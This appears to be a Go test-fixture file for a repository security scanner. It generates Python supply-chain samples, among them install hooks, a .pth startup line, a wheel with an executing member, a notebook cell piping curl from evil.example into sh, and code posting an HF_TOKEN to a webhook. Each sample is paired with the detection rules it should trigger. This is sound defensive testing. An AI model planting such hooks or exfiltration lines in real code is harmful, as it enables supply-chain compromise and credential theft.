@@ -1,0 +1,183 @@
+package main
+
+import (
+	"archive/zip"
+	"bytes"
+	"time"
+)
+
+// pysrc_fixtures covers plan step 9's Python/repository half: the repository files
+// that execute at install or interpreter start, the loader-safety lint, the
+// taint-ish Python rules, and a notebook. Every fixture is generated in Go (the
+// reference host has no Python and no network).
+//
+// The whl_in_repo/evil.whl fixture is a real ZIP built with archive/zip, with a
+// .pth member inside: that is the install-time supply-chain shape, and it is why
+// a wheel in a model repository is reported rather than trusted.
+func init() {
+	register(contributor{
+		name: "pysrc",
+		fixtures: func(f *fixtureSet) {
+			// A .pth line beginning with `import` is executed by site.py at the
+			// start of every interpreter run.
+			f.addText("pth_executable.pth", "import os\nos.system(\"id\")\n")
+
+			// Python 3.15+ *.start startup entry point.
+			f.addText("startup_entry.start", "evilpkg.hook:run\n")
+
+			// setup.py with a custom install command (runs during pip install).
+			f.addText("setup_install_hook/setup.py", `from setuptools import setup
+from setuptools.command.install import install
+
+
+class Install(install):
+    def run(self):
+        import os
+        os.system("id")
+        install.run(self)
+
+
+setup(name="evil", version="1.0", cmdclass={"install": Install})
+`)
+
+			// PEP 517 backend outside the known-good set: imported and run at build.
+			f.addText("pyproject_bad_backend/pyproject.toml", `[build-system]
+requires = ["evilbackend>=0.1"]
+build-backend = "evilbackend.build"
+`)
+
+			// sitecustomize.py is imported automatically at interpreter startup.
+			f.addText("sitecustomize_bad/sitecustomize.py", `import os
+os.environ["PYTHONSTARTUP"] = "/tmp/evil"
+`)
+
+			// pull_request_target runs with the base repo's secrets; interpolating
+			// github.event.* into a run: step is command injection there.
+			f.addText("workflow_prt/.github/workflows/x.yml", `name: x
+on:
+  pull_request_target:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: echo
+        run: echo "${{ github.event.pull_request.title }}"
+`)
+
+			// A wheel is a ZIP; its .pth member executes on install.
+			f.add("whl_in_repo/evil.whl", buildWheel())
+
+			// Notebook: a shell escape in one cell and a base64-decoded exec in
+			// another.
+			f.addText("notebook_b64.ipynb", `{
+ "cells": [
+  {"cell_type": "markdown", "metadata": {}, "source": ["# demo\n"]},
+  {"cell_type": "code", "execution_count": null, "metadata": {}, "outputs": [],
+   "source": ["!curl -s http://evil.example/p.sh | sh\n"]},
+  {"cell_type": "code", "execution_count": null, "metadata": {}, "outputs": [],
+   "source": ["import base64\n", "exec(base64.b64decode('cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk='))\n"]}
+ ],
+ "metadata": {},
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
+`)
+
+			// Env token posted to a webhook: source (os.getenv) -> network sink.
+			f.addText("python_exfil/model.py", `import os
+import requests
+
+TOKEN = os.getenv("HF_TOKEN")
+requests.post("https://webhook.example/collect", data=TOKEN)
+`)
+
+			// base64 blob decoded and exec'd: source -> exec sink, encoder+decoder.
+			f.addText("python_taint/modeling_x.py", `import base64
+
+payload = base64.b64decode('ZXhlYygncHJpbnQoMSknKQ==ZXhlYygncHJpbnQoMSknKQ==')
+exec(payload)
+`)
+
+			// Benign: guarded loader with a pinned revision, no taint.
+			f.addText("benign/model.py", `import torch
+from transformers import AutoModel
+
+REVISION = "0123456789abcdef0123456789abcdef01234567"
+
+
+def load(path):
+    state = torch.load(path, weights_only=True)
+    model = AutoModel.from_pretrained("org/model", revision=REVISION)
+    return model, state
+`)
+
+			// Benign notebook: one markdown cell and one plain print.
+			f.addText("benign/clean.ipynb", `{
+ "cells": [
+  {"cell_type": "markdown", "metadata": {}, "source": ["# clean\n"]},
+  {"cell_type": "code", "execution_count": 1, "metadata": {}, "outputs": [],
+   "source": ["print(\"hello\")\n"]}
+ ],
+ "metadata": {},
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
+`)
+		},
+		expectations: func() (malicious, benign map[string]expectation) {
+			return map[string]expectation{
+				"pth_executable.pth": {Expect: []string{"SC4N-REPO-PTH"},
+					Notes: "a .pth line starting with `import` runs at every interpreter start (Python site.py)"},
+				"startup_entry.start": {Expect: []string{"SC4N-REPO-START"},
+					Notes: "pkg.mod:callable is a Python 3.15 interpreter-startup entry point"},
+				"setup_install_hook/setup.py": {Expect: []string{"SC4N-REPO-SETUP-HOOK"},
+					Notes: "cmdclass install hook runs during pip install"},
+				"pyproject_bad_backend/pyproject.toml": {Expect: []string{"SC4N-REPO-BUILD-BACKEND"},
+					Notes: "PEP 517 build-backend outside the known-good set is imported and run at build time"},
+				"sitecustomize_bad/sitecustomize.py": {Expect: []string{"SC4N-REPO-SITE-CUSTOMIZE"},
+					Notes: "sitecustomize is imported automatically at interpreter startup"},
+				"workflow_prt/.github/workflows/x.yml": {Expect: []string{"SC4N-REPO-WORKFLOW-PRT"},
+					Notes: "pull_request_target plus ${{ github.event.* }} in a run: step"},
+				"whl_in_repo/evil.whl": {Expect: []string{"SC4N-REPO-WHEEL-IN-MODEL"},
+					Notes: "a real ZIP wheel in the scanned tree; its .pth member is scanned separately"},
+				"notebook_b64.ipynb": {Expect: []string{"SC4N-CODE-NOTEBOOK-MAGIC", "SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
+					Notes: "!curl|sh shell escape plus exec(base64.b64decode(long literal)) across two cells"},
+				"python_exfil/model.py": {Expect: []string{"SC4N-CODE-TAINT-NETWORK"},
+					Notes: "os.getenv token sent with requests.post to a webhook"},
+				"python_taint/modeling_x.py": {Expect: []string{"SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
+					Notes: "base64.b64decode source flows into exec"},
+			}, map[string]expectation{
+				"benign/model.py": {Forbid: []string{"SC4N-LOADER-TORCH-UNSAFE", "SC4N-LOADER-NO-REVISION", "SC4N-LOADER-NO-LOCAL-ONLY", "SC4N-CODE-TAINT-EXEC", "SC4N-CODE-TAINT-SHELL", "SC4N-CODE-OBFUSCATION"},
+					Notes: "torch.load(weights_only=True) and a 40-hex revision pin must not be reported"},
+				"benign/clean.ipynb": {Forbid: []string{"SC4N-CODE-NOTEBOOK-MAGIC", "SC4N-CODE-TAINT-EXEC"},
+					Notes: "a plain print cell must produce no findings"},
+			}
+		},
+	})
+}
+
+// buildWheel constructs a deterministic, well-formed wheel ZIP with a .pth member.
+func buildWheel() []byte {
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+	mod := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
+	add := func(name, body string) {
+		h := &zip.FileHeader{Name: name, Method: zip.Deflate, Modified: mod}
+		w, err := zw.CreateHeader(h)
+		if err != nil {
+			panic("pysrc fixtures: zip member " + name + ": " + err.Error())
+		}
+		if _, err := w.Write([]byte(body)); err != nil {
+			panic("pysrc fixtures: write " + name + ": " + err.Error())
+		}
+	}
+	add("evil.pth", "import os\nos.system(\"id\")\n")
+	add("evil/__init__.py", "__version__ = \"1.0\"\n")
+	add("evil-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n")
+	add("evil-1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nGenerator: sc4nfixtures\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
+	add("evil-1.0.dist-info/RECORD", "evil.pth,,\nevil/__init__.py,,\n")
+	if err := zw.Close(); err != nil {
+		panic("pysrc fixtures: close zip: " + err.Error())
+	}
+	return buf.Bytes()
+}
